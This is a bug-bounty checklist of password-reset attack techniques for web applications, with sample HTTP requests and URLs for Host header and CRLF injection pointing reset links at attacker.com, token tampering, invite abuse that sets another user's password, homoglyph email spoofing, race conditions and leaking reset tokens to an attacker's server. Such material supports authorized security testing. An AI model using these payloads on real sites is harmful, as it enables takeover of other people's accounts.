# 11. Password Reset Attack Checklist

Many of the ideas in this section are inspired by [HubSpot Full Account Takeover](https://medium.com/bugbountywriteup/hubspot-full-account-takeover-in-bug-bounty-4e2047914ab5).

## Use your own token against a victim's email

```
POST /reset
...
email=victim@gmail.com&token=$YOUR-TOKEN$
```

## Host Header Injection

```
POST /reset
Host: attacker.com
...
email=victim@gmail.com
```

## HTML injection in the Host header

```
POST /reset
Host: attacker">.com
...
email=victim@gmail.com
```

## Password reset token leak via the Referer header

```
Referrer: https://website.com/reset?token=1234
```

## Abuse company / corporate email invites

When inviting users to your account or organization, try inviting a corporate email address and add a new field such as `"password": "example123"` or `"pass": "example123"` in the request. Some applications use the same back-end logic for invites and account creation, so you may end up directly setting (or resetting) that user's password.

You can find corporate emails in the GitHub repos of the target's employees, or look them up on [hunter.io](http://hunter.io/). Some platforms have an "invite + set password" feature — abusing it lets you fully take over the invited mailbox owner's account, which then chains into SSO, support panels, etc. #BugBountyTips

## CRLF in the URL

```
With CRLF: /resetPassword?0a%0dHost:attacker.tld   (also try x-host, true-client-ip, x-forwarded-...)
```

## HTML injection in reset emails

HTML injection in password-reset / invitation emails (via parameters, cookies, etc.) → inject an `<img>` to your server → leak the reset token via the `Referer`.

## Token manipulation tricks

Remove the token entirely:

```
http://example.com/reset?email=victims@gmail.com&token=
```

Replace the token with all zeros:

```
http://example.com/reset?email=victims@gmail.com&token=0000000000
```

Replace it with `Null` / `nil`:

```
http://example.com/reset?eamil=victims@gmail.com&token=Null/nil
```

Try an array of old / previously-used tokens:

```
http://example.com/reset?eamil=victims@gmail.com&token=[old_token_2, old_token_1]
```

## SQLi bypass

Try SQLi auth-bypass payloads and wildcards (`or`, `%`, `*`).

## Request method / Content-Type swap

Change the request method (`GET`, `PUT`, `POST`, ...) and toggle the `Content-Type` between `application/xml` and `application/json`.

## Response manipulation

Replace a failure response with a success response (e.g. `{"success":false}` → `{"success":true}`, `4xx` → `200`).

## Oversized token

```
http://example.com/reset?email=victims@gmail.com&token=1000000 long string
```

## Cross-domain token usage

If the application owns multiple domains that share a single password-reset mechanism, a reset token generated on one domain sometimes still works on another — useful when a sister domain has weaker controls.

## Reset token leak in response body

Flip one character at the start / end of the token to see whether the server actually validates it (some apps just check whether *any* token is present).

## Use Unicode homoglyph tricks to spoof the email

Use Unicode look-alike characters (homoglyphs) to register an email that visually matches the victim's. The reset email is then sent to your inbox while the application thinks it sent it to the legitimate user.

## Look for race conditions

Fire two reset requests simultaneously (one for the victim, one for yourself) — token reuse / cross-assignment is a common race.

## Register the same local-part on different TLDs

Try registering the same email username on different TLDs (`.eu`, `.net`, ...) and see whether the application normalizes them or treats them as the same identity.